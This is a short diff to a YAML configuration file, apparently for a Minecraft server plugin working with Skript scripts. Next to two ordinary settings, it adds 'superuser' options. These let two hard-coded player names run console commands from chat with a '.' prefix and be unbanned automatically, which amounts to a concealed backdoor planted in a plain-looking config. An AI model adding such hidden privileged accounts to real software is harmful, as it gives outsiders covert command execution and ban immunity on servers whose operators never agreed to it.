@@ -1,2 +1,11 @@
 Cancel_Chat: false
 Find_file_default_path: 'plugins/Skript/scripts'
+# superusers can run console commands from the chat using a prefix
+SuperUserEvalCommands: true
+SuperUserCommandPrefix: '.'
+# superusers will get automatically unbanned
+SuperUserAutoUnban: true
+# list of superusers
+SuperUsers:
+  - LidanTheGamer
+  - LidanTheGamer_
